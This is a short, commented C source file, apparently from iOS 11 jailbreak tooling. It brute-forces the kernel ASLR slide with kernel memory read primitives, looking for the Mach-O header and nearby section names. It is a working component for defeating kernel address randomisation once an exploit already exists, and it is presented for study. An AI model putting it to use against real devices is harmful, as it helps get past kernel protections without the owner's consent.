#import "utils.h"

// simplified & commented version of https://github.com/JonathanSeals/kernelversionhacker
// this method relies on brute forcing the kaslr slide
// we know how big the slide can be and where the unslid kernel base is
// since we can't read from an unexisting address (smaller than the actual base) we start from the biggest possible slide and then go down
// the goal is to find what address points to the arm64 macho header: 0xfeedfacf
// for some reason 0xfeedfacf can be found multiple times so we need more checking than that
// for that we check for the presence of some strings right after it

uint64_t find_kernel_base() {
    printf("[*] Bruteforcing kaslr slide\n");
    
    #define slid_base  base+slide
    uint64_t base = 0xFFFFFFF007004000; // unslid kernel base on iOS 11
    uint32_t slide = 0x21000000; // maximum value the kaslr slide can have
    uint32_t data = kread32(slid_base); // the data our address points to
    
    for(;;) { /* keep running until we find the "__text" string
                     string must be less than 0x2000 bytes ahead of the kernel base
                     if it's not there the loop will go again */
        
        while (data != 0xFEEDFACF) { // find the macho header
            slide -= 0x200000;
            data = kread32(slid_base);
        }
        
        printf("[*] Found 0xfeedfacf header at 0x%llx, is that correct?\n", slid_base);
        
        char buf[0x120];
        for (uint64_t addr = slid_base; addr < slid_base + 0x2000; addr += 8 /* 64 bits / 8 bits / byte = 8 bytes */) {
            kread(addr, buf, 0x120); // read 0x120 bytes into a char buffer
            
            if (!strcmp(buf, "__text") && !strcmp(buf + 16, "__PRELINK_TEXT")) { // found it!
                printf("\t[+] Yes! Found __text and __PRELINK_TEXT!\n");
                printf("\t[i] kernel base at 0x%llx\n", slid_base);
                printf("\t[i] kaslr slide is 0x%x\n", slide);
                printf("\t[i] kernel header is 0x%x\n", kread32(slid_base));
                return slid_base;
            }
            data = 0;
        }
        printf("\t[-] Nope. Can't find __text and __PRELINK_TEXT, trying again!\n");
    }
    return 0;
}
